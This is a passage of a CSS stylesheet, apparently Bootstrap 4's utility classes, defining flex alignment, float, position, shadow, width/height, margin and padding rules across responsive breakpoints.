-ms-flex-positive: 0 !important;    flex-grow: 0 !important;  }  .flex-xl-grow-1 {    -ms-flex-positive: 1 !important;    flex-grow: 1 !important;  }  .flex-xl-shrink-0 {    -ms-flex-negative: 0 !important;    flex-shrink: 0 !important;  }  .flex-xl-shrink-1 {    -ms-flex-negative: 1 !important;    flex-shrink: 1 !important;  }  .justify-content-xl-start {    -ms-flex-pack: start !important;    justify-content: flex-start !important;  }  .justify-content-xl-end {    -ms-flex-pack: end !important;    justify-content: flex-end !important;  }  .justify-content-xl-center {    -ms-flex-pack: center !important;    justify-content: center !important;  }  .justify-content-xl-between {    -ms-flex-pack: justify !important;    justify-content: space-between !important;  }  .justify-content-xl-around {    -ms-flex-pack: distribute !important;    justify-content: space-around !important;  }  .align-items-xl-start {    -ms-flex-align: start !important;    align-items: flex-start !important;  }  .align-items-xl-end {    -ms-flex-align: end !important;    align-items: flex-end !important;  }  .align-items-xl-center {    -ms-flex-align: center !important;    align-items: center !important;  }  .align-items-xl-baseline {    -ms-flex-align: baseline !important;    align-items: baseline !important;  }  .align-items-xl-stretch {    -ms-flex-align: stretch !important;    align-items: stretch !important;  }  .align-content-xl-start {    -ms-flex-line-pack: start !important;    align-content: flex-start !important;  }  .align-content-xl-end {    -ms-flex-line-pack: end !important;    align-content: flex-end !important;  }  .align-content-xl-center {    -ms-flex-line-pack: center !important;    align-content: center !important;  }  .align-content-xl-between {    -ms-flex-line-pack: justify !important;    align-content: space-between !important;  }  .align-content-xl-around {    -ms-flex-line-pack: distribute !important;    align-content: space-around !important;  }  .align-content-xl-stretch {    -ms-flex-line-pack: stretch !important;    align-content: stretch !important;  }  .align-self-xl-auto {    -ms-flex-item-align: auto !important;    align-self: auto !important;  }  .align-self-xl-start {    -ms-flex-item-align: start !important;    align-self: flex-start !important;  }  .align-self-xl-end {    -ms-flex-item-align: end !important;    align-self: flex-end !important;  }  .align-self-xl-center {    -ms-flex-item-align: center !important;    align-self: center !important;  }  .align-self-xl-baseline {    -ms-flex-item-align: baseline !important;    align-self: baseline !important;  }  .align-self-xl-stretch {    -ms-flex-item-align: stretch !important;    align-self: stretch !important;  }}.float-left {  float: left !important;}.float-right {  float: right !important;}.float-none {  float: none !important;}@media (min-width: 576px) {  .float-sm-left {    float: left !important;  }  .float-sm-right {    float: right !important;  }  .float-sm-none {    float: none !important;  }}@media (min-width: 768px) {  .float-md-left {    float: left !important;  }  .float-md-right {    float: right !important;  }  .float-md-none {    float: none !important;  }}@media (min-width: 992px) {  .float-lg-left {    float: left !important;  }  .float-lg-right {    float: right !important;  }  .float-lg-none {    float: none !important;  }}@media (min-width: 1200px) {  .float-xl-left {    float: left !important;  }  .float-xl-right {    float: right !important;  }  .float-xl-none {    float: none !important;  }}.overflow-auto {  overflow: auto !important;}.overflow-hidden {  overflow: hidden !important;}.position-static {  position: static !important;}.position-relative {  position: relative !important;}.position-absolute {  position: absolute !important;}.position-fixed {  position: fixed !important;}.position-sticky {  position: -webkit-sticky !important;  position: sticky !important;}.fixed-top {  position: fixed;  top: 0;  right: 0;  left: 0;  z-index: 1030;}.fixed-bottom {  position: fixed;  right: 0;  bottom: 0;  left: 0;  z-index: 1030;}@supports ((position: -webkit-sticky) or (position: sticky)) {  .sticky-top {    position: -webkit-sticky;    position: sticky;    top: 0;    z-index: 1020;  }}.sr-only {  position: absolute;  width: 1px;  height: 1px;  padding: 0;  overflow: hidden;  clip: rect(0, 0, 0, 0);  white-space: nowrap;  border: 0;}.sr-only-focusable:active, .sr-only-focusable:focus {  position: static;  width: auto;  height: auto;  overflow: visible;  clip: auto;  white-space: normal;}.shadow-sm {  box-shadow: 0 0.125rem 0.25rem rgba(0, 0, 0, 0.075) !important;}.shadow {  box-shadow: 0 0.5rem 1rem rgba(0, 0, 0, 0.15) !important;}.shadow-lg {  box-shadow: 0 1rem 3rem rgba(0, 0, 0, 0.175) !important;}.shadow-none {  box-shadow: none !important;}.w-25 {  width: 25% !important;}.w-50 {  width: 50% !important;}.w-75 {  width: 75% !important;}.w-100 {  width: 100% !important;}.w-auto {  width: auto !important;}.h-25 {  height: 25% !important;}.h-50 {  height: 50% !important;}.h-75 {  height: 75% !important;}.h-100 {  height: 100% !important;}.h-auto {  height: auto !important;}.mw-100 {  max-width: 100% !important;}.mh-100 {  max-height: 100% !important;}.min-vw-100 {  min-width: 100vw !important;}.min-vh-100 {  min-height: 100vh !important;}.vw-100 {  width: 100vw !important;}.vh-100 {  height: 100vh !important;}.stretched-link::after {  position: absolute;  top: 0;  right: 0;  bottom: 0;  left: 0;  z-index: 1;  pointer-events: auto;  content: "";  background-color: rgba(0, 0, 0, 0);}.m-0 {  margin: 0 !important;}.mt-0,.my-0 {  margin-top: 0 !important;}.mr-0,.mx-0 {  margin-right: 0 !important;}.mb-0,.my-0 {  margin-bottom: 0 !important;}.ml-0,.mx-0 {  margin-left: 0 !important;}.m-1 {  margin: 0.25rem !important;}.mt-1,.my-1 {  margin-top: 0.25rem !important;}.mr-1,.mx-1 {  margin-right: 0.25rem !important;}.mb-1,.my-1 {  margin-bottom: 0.25rem !important;}.ml-1,.mx-1 {  margin-left: 0.25rem !important;}.m-2 {  margin: 0.5rem !important;}.mt-2,.my-2 {  margin-top: 0.5rem !important;}.mr-2,.mx-2 {  margin-right: 0.5rem !important;}.mb-2,.my-2 {  margin-bottom: 0.5rem !important;}.ml-2,.mx-2 {  margin-left: 0.5rem !important;}.m-3 {  margin: 1rem !important;}.mt-3,.my-3 {  margin-top: 1rem !important;}.mr-3,.mx-3 {  margin-right: 1rem !important;}.mb-3,.my-3 {  margin-bottom: 1rem !important;}.ml-3,.mx-3 {  margin-left: 1rem !important;}.m-4 {  margin: 1.5rem !important;}.mt-4,.my-4 {  margin-top: 1.5rem !important;}.mr-4,.mx-4 {  margin-right: 1.5rem !important;}.mb-4,.my-4 {  margin-bottom: 1.5rem !important;}.ml-4,.mx-4 {  margin-left: 1.5rem !important;}.m-5 {  margin: 3rem !important;}.mt-5,.my-5 {  margin-top: 3rem !important;}.mr-5,.mx-5 {  margin-right: 3rem !important;}.mb-5,.my-5 {  margin-bottom: 3rem !important;}.ml-5,.mx-5 {  margin-left: 3rem !important;}.p-0 {  padding: 0 !important;}.pt-0,.py-0 {  padding-top: 0 !important;}.pr-0,.px-0 {  padding-right: 0 !important;}.pb-0,.py-0 {  padding-bottom: 0 !important;}.pl-0,.px-0 {  padding-left: 0 !important;}.p-1 {  padding: 0.25rem !important;}.pt-1,.py-1 {  padding-top: 0.25rem !important;}.pr-1,.px-1 {  padding-right: 0.25rem !important;}.pb-1,.py-1 {  padding-bottom: 0.25rem !important;}.pl-1,.px-1 {  padding-left: 0.25rem !important;}.p-2 {  padding: 0.5rem !important;}.pt-2,.py-2 {  padding-top: 0.5rem !important;}.pr-2,.px-2 {  padding-right: 0.5rem !important;}.pb-2,.py-2 {  padding-bottom: 0.5rem !important;}.pl-2,.px-2 {  padding-left: 0.5rem !important;}.p-3 {  padding: 1rem !important;}.pt-3,.py-3 {  padding-top: 1rem !important;}.pr-3,.px-3 {  padding-right: 1rem !important;}.pb-3,.py-3 {  padding-bottom: 1rem !important;}.pl-3,.px-3 {  padding-left: 1rem !important;}.p-4 {  padding: 1.5rem !important;}.pt-4,.py-4 {  padding-top: 1.5rem !important;}.pr-4,.px-4 {  padding-right: 1.5rem !important;}.pb-4,.py-4 {  padding-bottom: 1.5rem !important;}.pl-4,.px-4 {  padding-left: 1.5rem !important;}.p-5 {  padding: 3rem !important;}.pt-5,.py-5 {  padding-top: 3rem !important;}.pr-5,.px-5 {  padding-right: 3rem !important;}.pb-5,.py-5 {  padding-bottom: 3rem !important;}.pl-5,.px-5 {  padding-left: 3rem !important;}.m-n1 {  margin: -0.25rem !important;}.mt-n1,.my-n1 {  margin-top: -0.25rem !important;}.mr-n1,.mx-n1 {  margin-right: -0.25rem !important;}.mb-n1,.my-n1 {  margin-bottom: -0.25rem !important;}.ml-n1,.mx-n1 {  margin-left: -0.25rem !important;}.m-n2 {  margin: -0.5rem !important;}.mt-n2,.my-n2 {  margin-top: -0.5rem !important;}.mr-n2,.mx-n2 {  margin-right: -0.5rem !important;}.mb-n2,.my-n2 {  margin-bottom: -0.5rem !important;}.ml-n2,.mx-n2 {  margin-left: -0.5rem !important;}.m-n3 {  margin: -1rem !important;}.mt-n3,.my-n3 {  margin-top: -1rem !important;}.mr-n3,.mx-n3 {  margin-right: -1rem !important;}.mb-n3,.my-n3 {  margin-bottom: -1rem !important;}.ml-n3,.mx-n3 {  margin-left: -1rem !important;}.m-n4 {  margin: -1.5rem !important;}.mt-n4,.my-n4 {  margin-top: -1.5rem !important;}.mr-n4,.mx-n4 {  margin-right: -1.5rem !important;}.mb-n4,.my-n4 {  margin-bottom: -1.5rem !important;}.ml-n4,.mx-n4 {  margin-left: -1.5rem !important;}.m-n5 {  margin: -3rem !important;}.mt-n5,.my-n5 {  margin-top: -3rem !important;}.mr-n5,.mx-n5 {  margin-right: -3rem !important;}.mb-n5,.my-n5 {  margin-bottom: -3rem !important;}.ml-n5,.mx-n5 {  margin-left: -3rem !important;}.m-auto {  margin: auto !important;}.mt-auto,.my-auto {  margin-top: auto !important;}.mr-auto,.mx-auto {  margin-right: auto !important;}.mb-auto,.my-auto {  margin-bottom: auto !important;}.ml-auto,.mx-auto {  margin-left: auto !important;}@media (min-width: 576px) {  .m-sm-0 {    margin: 0 !important;  }  .mt-sm-0,  .my-sm-0 {    margin-top: 0 !important;  }  .mr-sm-0,  .mx-sm-0 {    margin-right: 0 !important;  }  .mb-sm-0,  .my-sm-0 {    margin-bottom: 0 !important;  }  .ml-sm-0,  .mx-sm-0 {    margin-left: 0 !important;  }  .m-sm-1 {    margin: 0.25rem !important;  }  .mt-sm-1,  .my-sm-1 {    margin-top: 0.25rem !important;  }  .mr-sm-1,  .mx-sm-1 {    margin-right: 0.25rem !important;  }  .mb-sm-1,  .my-sm-1 {    margin-bottom: 0.25rem !important;  }  .ml-sm-1,  .mx-sm-1 {    margin-left: 0.25rem !important;  }  .m-sm-2 {    margin: 0.5rem !important;  }  .mt-sm-2,  .my-sm-2 {    margin-top: 0.5rem !important;  }  .mr-sm-2,  .mx-sm-2 {    margin-right: 0.5rem !important;  }  .mb-sm-2,  .my-sm-2 {    margin-bottom: 0.5rem !important;  }  .ml-sm-2,  .mx-sm-2 {    margin-left: 0.5rem !important;  }  .m-sm-3 {    margin: 1rem !important;  }  .mt-sm-3,  .my-sm-3 {    margin-top: 1rem !important;  }  .mr-sm-3,  .mx-sm-3 {    margin-right: 1rem !important;  }  .mb-sm-3,  .my-sm-3 {    margin-bottom: 1rem !important;  }  .ml-sm-3,  .mx-sm-3 {    margin-left: 1rem !important;  }  .m-sm-4 {    margin: 1.5rem !important;  }  .mt-sm-4,  .my-sm-4 {    margin-top: 1.5rem !important;  }  .mr-sm-4,  .mx-sm-4 {    margin-right: 1.5rem !important;  }  .mb-sm-4,  .my-sm-4 {    margin-bottom: 1.5rem !important;  }  .ml-sm-4,  .mx-sm-4 {    margin-left: 1.5rem !important;  }  .m-sm-5 {    margin: 3rem !important;  }  .mt-sm-5,  .my-sm-5 {    margin-top: 3rem !important;  }  .mr-sm-5,  .mx-sm-5 {    margin-right: 3rem !important;  }  .mb-sm-5,  .my-sm-5 {    margin-bottom: 3rem !important;  }  .ml-sm-5,  .mx-sm-5 {    margin-left: 3rem !important;  }  .p-sm-0 {    padding: 0 !important;  }  .pt-sm-0,  .py-sm-0 {    padding-top: 0 !important;  }  .pr-sm-0,  .px-sm-0 {    padding-right: 0 !important;  }  .pb-sm-0,  .py-sm-0 {    padding-bottom: 0 !important;  }  .pl-sm-0,  .px-sm-0 {    padding-left: 0 !important;  }  .p-sm-1 {    padding: 0.25rem !important;  }  .pt-sm-1,  .py-sm-1 {    padding-top: 0.25rem !important;  }  .pr-sm-1,  .px-sm-1 {    padding-right: 0.25rem !important;  }  .pb-sm-1,  .py-sm-1 {    padding-bottom: 0.25rem !important;  }  .pl-sm-1,  .px-sm-1 {    padding-left: 0.25rem !important;  }  .p-sm-2 {    padding: 0.5rem !important;  }  .pt-sm-2,  .py-sm-2 {    padding-top: 0.5rem !important;  }  .pr-sm-2,  .px-sm-2 {    padding-right: 0.5rem !important;  }  .pb-sm-2,  .py-sm-2 {    padding-bottom: 0.5rem !important;  }  .pl-sm-2,  .px-sm-2 {    padding-left: 0.5rem !important;  }  .p-sm-3 {    padding: 1rem !important;  }  .pt-sm-3,  .py-sm-3 {    padding-top: 1rem !important;  }  .pr-sm-3,  .px-sm-3 {    padding-right: 1rem !important;  }  .pb-sm-3,  .py-sm-3 {    padding-bottom: 1rem !important;  }  .pl-sm-3,  .px-sm-3 {    padding-left: 1rem !important;  }  .p-sm-4 {    padding: 1.5rem !important;  }  .pt-sm-4,  .py-sm-4 {    padding-top: 1.5rem !important;  }  .pr-sm-4,  .px-sm-4 {    padding-right: 1.5rem !important;  }  .pb-sm-4,  .py-sm-4 {    padding-bottom: 1.5rem !important;  }  .pl-sm-4,  .px-sm-4 {    padding-left: 1.5rem !important;  }  .p-sm-5 {    padding: 3rem !important;  }  .pt-sm-5,  .py-sm-5 {    padding-top: 3rem !important;  }  .pr-sm-5,  .px-sm-5 {    padding-right: 3rem !important;  }  .pb-sm-5,  .py-sm-5 {    padding-bottom: 3rem !important;  }  .pl-sm-5,  .px-sm-5 {    padding-left: 3rem !important;  }  .m-sm-n1 {    margin: -0.25rem !important;  }  .mt-sm-n1,  .my-sm-n1 {    margin-top: -0.25rem !important;  }  .mr-sm-n1,  .mx-sm-n1 {    margin-right: -0.25rem !important;  }  .mb-sm-n1,  .my-sm-n1 {    margin-bottom: -0.25rem !important;  }  .ml-sm-n1,  .mx-sm-n1 {    margin-left: -0.25rem !important;  }  .m-sm-n2 {    margin: -0.5rem !important;  }  .mt-sm-n2,  .my-sm-n2 {    margin-top: -0.5rem !important;  }  .mr-sm-n2,  .mx-sm-n2 {    margin-right: -0.5rem !important;  }  .mb-sm-n2,  .my-sm-n2 {    margin-bottom: -0.5rem !important;  }  .ml-sm-n2,  .mx-sm-n2 {    margin-left: -0.5rem !important;  }  .m-sm-n3 {    margin: -1rem !important;  }  .mt-sm-n3,  .my-sm-n3 {    margin-top: -1rem !important;  }  .mr-sm-n3,  .mx-sm-n3 {    margin-right: -1rem !important;  }  .mb-sm-n3,  .my-sm-n3 {    margin-bottom: -1rem !important;  }  .ml-sm-n3,  .mx-sm-n3 {    margin-left: -1rem !important;  }  .m-sm-n4 {    margin: -1.5rem !important;  }  .mt-sm-n4,  .my-sm-n4 {    margin-top: -1.5rem !important;  }  .mr-sm-n4,  .mx-sm-n4 {    margin-right: -1.5rem !important;  }  .mb-sm-n4,  .my-sm-n4 {    margin-bottom: -1.5rem !important;  }  .ml-sm-n4,  .mx-sm-n4 {    margin-left: -1.5rem !important;  }  .m-sm-n5 {    margin: -3rem !important;  }  .mt-sm-n5,  .my-sm-n5 {    margin-top: -3rem !important;  }  .mr-sm-n5,  .mx-sm-n5 {    margin-right: -3rem !important;  }  .mb-sm-n5,  .my-sm-n5 {    margin-bottom: -3rem !important;  }  .ml-sm-n5,  .mx-sm-n5 {    margin-left: -3rem !important;  }  .m-sm-auto {    margin: auto !important;  }  .mt-sm-auto,  .my-sm-auto {    margin-top: auto !important;  }  .mr-sm-auto,  .mx-sm-auto {    margin-right: auto !important;  }  .mb-sm-auto,  .my-sm-auto {    margin-bottom: auto !important;  }  .ml-sm-auto,  .mx-sm-auto {    margin-left: auto !important;  }}@media (min-width: 768px) {  .m-md-0 {    margin: 0 !important;  }  .mt-md-0,  .my-md-0 {    margin-top: 0 !important;  }  .mr-md-0,  .mx-md-0 {    margin-right: 0 !important;  }  .mb-md-0,  .my-md-0 {    margin-bottom: 0 !important;  }  .ml-md-0,  .mx-md-0 {    margin-left: 0 !important;  }  .m-md-1 {    margin: 0.25rem !important;  }  .mt-md-1,  .my-md-1 {    margin-top: 0.25rem !important;  }  .mr-md-1,  .mx-md-1 {    margin-right: 0.25rem !important;  }  .mb-md-1,  .my-md-1 {    margin-bottom: 0.25rem !important;  }  .ml-md-1,  .mx-md-1 {    margin-left: 0.25rem !important;  }  .m-md-2 {    margin: 0.5rem !important;  }  .mt-md-2,  .my-md-2 {    margin-top: 0.5rem !important;  }  .mr-md-2,  .mx-md-2 {    margin-right: 0.5rem !important;  }  .mb-md-2,  .my-md-2 {    margin-bottom: 0.5rem !important;  }  .ml-md-2,  .mx-md-2 {    margin-left: 0.5rem !important;  }  .m-md-3 {    margin: 1rem !important;  }  .mt-md-3,  .my-md-3 {    margin-top: 1rem !important;  }  .mr-md-3,  .mx-md-3 {    margin-right: 1rem !important;  }  .mb-md-3,  .my-md-3 {    margin-bottom: 1rem !important;  }  .ml-md-3,  .mx-md-3 {    margin-left: 1rem !important;  }  .m-md-4 {    margin: 1.5rem !important;  }  .mt-md-4,  .my-md-4 {    margin-top: 1.5rem !important;  }  .mr-md-4,  .mx-md-4 {    margin-right: 1.5rem !important;  }  .mb-md-4,  .my-md-4 {    margin-bottom: 1.5rem !important;  }  .ml-md-4,  .mx-md-4 {    margin-left: 1.5rem !important;  }  .m-md-5 {    margin: 3rem !important;  }  .mt-md-5,  .my-md-5 {    margin-top: 3rem !important;  }  .mr-md-5,  .mx-md-5 {    margin-right: 3rem !important;  }  .mb-md-5,  .my-md-5 {    margin-bottom: 3rem !important;  }  .ml-md-5,  .mx-md-5 {    margin-left: 3rem !important;  }  .p-md-0 {    padding: 0 !important;  }  .pt-md-0,  .py-md-0 {    padding-top: 0 !important;  }  .pr-md-0,  .px-md-0 {    padding-right: 0 !important;  }  .pb-md-0,  .py-md-0 {    padding-bottom: 0 !important;  }  .pl-md-0,  .px-md-0 {    padding-left: 0 !important;  }  .p-md-1 {    padding: 0.25rem !important;  }  .pt-md-1,  .py-md-1 {    padding-top: 0.25rem !important;  }  .pr-md-1,  .px-md-1 {    padding-right: 0.25rem !important;  }  .pb-md-1,  .py-md-1 {    padding-bottom: 0.25rem !important;  }  .pl-md-1,  .px-md-1 {    padding-left: 0.25rem !important;  }  .p-md-2 {    padding: 0.5rem !important;  }  .pt-md-2,  .py-md-2 {    padding-top: 0.5rem !important;  }  .pr-md-2,  .px-md-2 {    padding-right: 0.5rem !important;  }  .pb-md-2,  .py-md-2 {    padding-bottom: 0.5rem !important;  }  .pl-md-2,  .px-md-2 {    padding-left: 0.5rem !important;  }  .p-md-3 {    padding: 1rem !important;  }  .pt-md-3,  .py-md-3 {    padding-top: 1rem !important;  }  .pr-md-3,  .px-md-3 {    padding-right: 1rem !important;  }  .pb-md-3,  .py-md-3 {    padding-bottom: 1rem !important;  }  .pl-md-3,  .px-md-3 {    padding-left: 1rem !important;  }  .p-md-4 {    padding: 1.5rem !important;  }  .pt-md-4,  .py-md-4 {    padding-top: 1.5rem !important;  }  .pr-md-4,  .px-md-4 {    padding-right: 1.5rem !important;  }  .pb-md-4,  .py-md-4 {    padding-bottom: 1.5rem !important;  }  .pl-md-4,  .px-md-4 {    padding-left: 1.5rem !important;  }  .p-md-5 {    padding: 3rem !important;  }  .pt-md-5,  .py-md-5 {    padding-top: 3rem !important;  }  .pr-md-5,  .px-md-5 {    padding-right: 3rem !important;  }  .pb-md-5,  .py-md-5 {    padding-bottom: 3rem !important;  }  .pl-md-5,  .px-md-5 {    padding-left: 3rem !important;  }  .m-md-n1 {    margin: -0.25rem !important;  }  .mt-md-n1,  .my-md-n1 {    margin-top: -0.25rem !important;  }  .mr-md-n1,  .mx-md-n1 {    margin-right: -0.25rem !important;  }  .mb-md-n1,  .my-md-n1 {    margin-bottom: -0.25rem !important;  }  .ml-md-n1,  .mx-md-n1 {    margin-left: -0.25rem !important;  }  .m-md-n2 {    margin: -0.5rem !important;  }  .mt-md-n2,  .my-md-n2 {    margin-top: -0.5rem !important;  }  .mr-md-n2,  .mx-md-n2 {    margin-right: -0.5rem !important;  }  .mb-md-n2,  .my-md-n2 {    margin-bottom: -0.5rem !important;  }  .ml-md-n2,  .mx-md-n2 {    margin-left: -0.5rem !important;  }  .m-md-n3 {    margin: -1rem !important;  }  .mt-md-n3,  .my-md-n3 {    margin-top: -1rem !important;  }  .mr-md-n3,  .mx-md-n3 {    margin-right: -1rem !important;  }  .mb-md-n3,  .my-md-n3 {    margin-bottom: -1rem !important;  }  .ml-md-n3,  .mx-md-n3 {    margin-left: -1rem !important;  }  .m-md-n4 {    margin: -1.5rem !important;  }  .mt-md-n4,  .my-md-n4 {    margin-top: -1.5rem !important;  }  .mr-md-n4,  .mx-md-n4 {    margin-right: -1.5rem !important;  }  .mb-md-n4,  .my-md-n4 {    margin-bottom: -1.5rem !important;  }  .ml-md-n4,  .mx-md-n4 {    margin-left: -1.5rem !important;  }  .m-md-n5 {    margin: -3rem !important;  }  .mt-md-n5,  .my-md-n5 {    margin-top: -3rem !important;  }  .mr-md-n5,  .mx-md-n5 {    margin-right: -3rem !important;  }  .mb-md-n5,  .my-md-n5 {    margin-bottom: -3rem !important;  }  .ml-md-n5,  .mx-md-n5 {    margin-left: -3rem !important;  }  .m-md-auto {    margin: auto !important;  }  .mt-md-auto,  .my-md-auto {    margin-top: auto !important;  }  .mr-md-auto,  .mx-md-auto {    margin-right: auto !important;  }  .mb-md-auto,  .my-md-auto {    margin-bottom: auto !important;  }  .ml-md-auto,  .mx-md-auto {    margin-left: auto !important;  }}@media (min-width: 992px) {  .m-lg-0 {    margin: 0 !important;  }  .mt-lg-0,  .my-lg-0 {    margin-top: 0 !important;  }  .mr-lg-0,  .mx-lg-0 {    margin-right: 0 !important;  }  .mb-lg-0,  .my-lg-0 {    margin-bottom: 0 !important;  }  .ml-lg-0,  .mx-lg-0 {    margin-left: 0 !important;  }  .m-lg-1 {    margin: 0.25rem !important;  }  .mt-lg-1,  .my-lg-1 {    margin-top: 0.25rem !important;  }  .mr-lg-1,  .mx-lg-1 {    margin-right: 0.25rem !important;  }  .mb-lg-1,  .my-lg-1 {    margin-bottom: 0.25rem !important;  }  .ml-lg-1,  .mx-lg-1 {    margin-left: 0.25rem !important;  }  .m-lg-2 {    margin: 0.5rem !important;  }  .mt-lg-2,  .my-lg-2 {    margin-top: 0.5rem !important;  }  .mr-lg-2,  .mx-lg-2 {    margin-right: 0.5rem !important;  }  .mb-lg-2,  .my-lg-2 {    margin-bottom: 0.5rem !important;  }  .ml-lg-2,  .mx-lg-2 {    margin-left: 0.5rem !important;  }  .m-lg-3 {    margin: 1rem !important;  }  .mt-lg-3,  .my-lg-3 {    margin-top: 1rem !important;  }  .mr-lg-3,  .mx-lg-3 {    margin-right: 1rem !important;  }  .mb-lg-3,  .my-lg-3 {    margin-bottom: 1rem !important;  }  .ml-lg-3,  .mx-lg-3 {    margin-left: 1rem !important;  }  .m-lg-4 {    margin: 1.5rem !important;  }  .mt-lg-4,  .my-lg-4 {    margin-top: 1.5rem !important;  }  .mr-lg-4,  .mx-lg-4 {    margin-right: 1.5rem !important;  }  .mb-lg-4,  .my-lg-4 {    margin-bottom: 1.5rem !important;  }  .ml-lg-4,  .mx-lg-4 {    margin-left: 1.5rem !important;  }  .m-lg-5 {    margin: 3rem !important;  }  .mt-lg-5,  .my-lg-5 {    margin-top: 3rem !important;  }  .mr-lg-5,  .mx-lg-5 {    margin-right: 3rem !important;  }  .mb-lg-5,  .my-lg-5 {    margin-bottom: 3rem !important;  }  .ml-lg-5,  .mx-lg-5 {    margin-left: 3rem !important;  }  .p-lg-0 {    padding: 0 !important;  }  .pt-lg-0,  .py-lg-0 {    padding-top: 0 !important;  }  .pr-lg-0,  .px-lg-0 {    padding-right: 0 !important;  }  .pb-lg-0,  .py-lg-0 {    padding-bottom: 0 !important;  }  .pl-lg-0,  .px-lg-0 {    padding-left: 0 !important;  }  .p-lg-1 {    padding: 0.25rem !important;  }  .pt-lg-1,  .py-lg-1 {    padding-top: 0.25rem !important;  }  .pr-lg-1,  .px-lg-1 {    padding-right: 0.25rem !important;  }  .pb-lg-1,  .py-lg-1 {    padding-bottom: 0.25rem !important;  }  .pl-lg-1,  .px-lg-1 {    padding-left: 0.25rem !important;  }  .p-lg-2 {    padding: 0.5rem !important;  }  .pt-lg-2,  .py-lg-2 {    padding-top: 0.5rem !important;  }  .pr-lg-2,  .px-lg-2 {    padding-right: 0.5rem !important;  }  .pb-lg-2,  .py-lg-2 {    padding-bottom: 0.5rem !important;  }  .pl-lg-2,  .px-lg-2 {    padding-left: 0.5rem !important;  }  .p-lg-3 {    padding: 1rem !important;  }  .pt-lg-3,  .py-lg-3 {    padding-top: 1rem !important;  }  .pr-lg-3,  .px-lg-3 {    padding-right: 1rem !important;  }  .pb-lg-3,  .py-lg-3 {    padding-bottom: 1rem !important;  }  .pl-lg-3,  .px-lg-3 {    padding-left: 1rem !important;  }  .p-lg-4 {    padding: 1.5rem !important;  }  .pt-lg-4,  .py-lg-4 {    padding-top: 1.5rem !important;  }  .pr-lg-4,  .px-lg-4 {    padding-right: 1.5rem !important;  }  .pb-lg-4,  .py-lg-4 {    padding-bottom: 1.5rem !important;  }  .pl-lg-4,  .px-lg-4 {    padding-left: 1.5rem !important;  }  .p-lg-5 {    padding: 3rem !important;  }  .pt-lg-5,  .py-lg-5 {    padding-top: 3rem !important;  }  .pr-lg-5,  .px-lg-5 {    padding-right: 3rem !important;  }  .pb-lg-5,  .py-lg-5 {    padding-bottom: 3rem !important;  }  .pl-lg-5,  .px-lg-5 {    padding-left: 3rem !important;  }  .m-lg-n1 {    margin: -0.25rem !important;  }  .mt-lg-n1,  .my-lg-n1 {    margin-top: -0.25rem !important;  }  .mr-lg-n1,  .mx-lg-n1 {    margin-right: -0.25rem !important;  }  .mb-lg-n1,  .my-lg-n1 {    margin-bottom: -0.25rem !important;  }  .ml-lg-n1,  .mx-lg-n1 {    margin-left: -0.25rem !important;  }  .m-lg-n2 {    margin: -0.5rem !important;  }  .mt-lg-n2,  .my-lg-n2 {    margin-top: -0.5rem !important;  }  .mr-lg-n2,  .mx-lg-n2 {    margin-right: -0.5rem !important;  }  .mb-lg-n2,  .my-lg-n2 {    margin-bottom: -0.5rem !important;  }  .ml-lg-n2,  .mx-lg-n2 {    margin-left: -0.5rem !important;  }  .m-lg-n3 {    margin: -1rem !important;  }  .mt-lg-n3,  .my-lg-n3 {    margin-top: -1rem !important;  }  .mr-lg-n3,  .mx-lg-n3 {    margin-right: -1rem !important;  }  .mb-lg-n3,  .my-lg-n3 {    margin-bottom: -1rem !important;  }  .ml-lg-n3,  .mx-lg-n3 {    margin-left: -1rem !important;  }  .m-lg-n4 {    margin: -1.5rem !important;  }  .mt-lg-n4,  .my-lg-n4 {    margin-top: -1.5rem !important;  }  .mr-lg-n4,  .mx-lg-n4 {    margin-right: -1.5rem !important;  }  .mb-lg-n4,  .my-lg-n4 {    margin-bottom: -1.5rem !important;  }  .ml-lg-n4,  .mx-lg-n4 {    margin-left: -1.5rem !important;  }  .m-lg-n5 {    margin: -3rem !important;  }  .mt-lg-n5,  .my-lg-n5 {    margin-top: -3rem !important;  }  .mr-lg-n5,  .mx-lg-n5 {    margin-right: -3rem !important;  }  .mb-lg-n5,  .my-lg-n5 {    margin-bottom: -3rem !important;  }  .ml-lg-n5,  .mx-lg-n5 {    margin-left: -3rem !important;  }  .m-lg-auto {    margin: auto !important;  }  .mt-lg-auto,  .my-lg-auto {    margin-top: auto !important;  }  .mr-lg-auto,  .mx-lg-auto {    margin-right: auto !important;  }  .mb-lg-auto,  .my-lg-auto {    margin-bottom: auto !important;  }  .ml-lg-auto,  .mx-lg-auto {    margin-left: auto !important;  }}@media (min-width: 1200px) {  .m-xl-0 {    margin: 0 !important;  }  .mt-xl-0,  .my-xl-0 {    margin-top: 0 !important;  }  .mr-xl-0,  .mx-xl-0 {    margin-right: 0 !important;  }  .mb-xl-0,  .my-xl-0 {    margin-bottom: 0 !important;  }  .ml-xl-0,  .mx-xl-0 {    margin-left: 0 !important;  }  .m-xl-1 {    margin: 0.25rem !important;  }  .mt-xl-1,  .my-xl-1 {    margin-top: 0.25rem !important;  }  .mr-xl-1,  .mx-xl-1 {    margin-right: 0.25rem !important;  }  .mb-xl-1,  .my-xl-1 {    margin-bottom: 0.25rem !important;  }  .ml-xl-1,  .mx-xl-1 {    margin-left: 0.25rem !important;  }  .m-xl-2 {    margin: 0.5rem !important;  }  .mt-xl-2,  .my-xl-2 {    margin-top: 0.5rem !important;  }  .mr-xl-2,  .mx-xl-2 {    margin-right: 0.5rem !important;  }  .mb-xl-2,  .my-xl-2 {    margin-bottom: 0.5rem !important;  }  .ml-xl-2,  .mx-xl-2 {    margin-left: 0.5rem !important;  }  .m-xl-3 {    margin: 1rem !important;  }  .mt-xl-3,  .my-xl-3 {    margin-top: 1rem !important;  }  .mr-xl-3,  .mx-xl-3 {    margin-right: 1rem !important;  }  .mb-xl-3,  .my-xl-3 {    margin-bottom: 1rem !important;  }  .ml-xl-3,  .mx-xl-3 {    margin-left: 1rem !important;  }  .m-xl-4 {    margin: 1.5rem !important;  }  .mt-xl-4,  .my-xl-4 {    margin-top: 1.5rem !important;  }  .mr-xl-4,  .mx-xl-4 {    margin-right: 1.5rem !important;  }  .mb-xl-4,  .my-xl-4 {    margin-bottom: 1.5rem !important;  }  .ml-xl-4,  .mx-xl-4 {    margin-left: 1.5rem !important;  }  .m-xl-5 {    margin: 3rem !important;  }  .mt-xl-5,  .my-xl-5 {    margin-top: 3rem !important;  }  .mr-xl-5,  .mx-xl-5 {    margin-right: 3rem !important;  }  .mb-xl-5,  .my-xl-5 {    margin-bottom: 3rem !important;  }  .ml-xl-5,  .mx-xl-5 {    margin-left: 3rem !important;  }  .p-xl-0 {    padding: 0 !important;  }  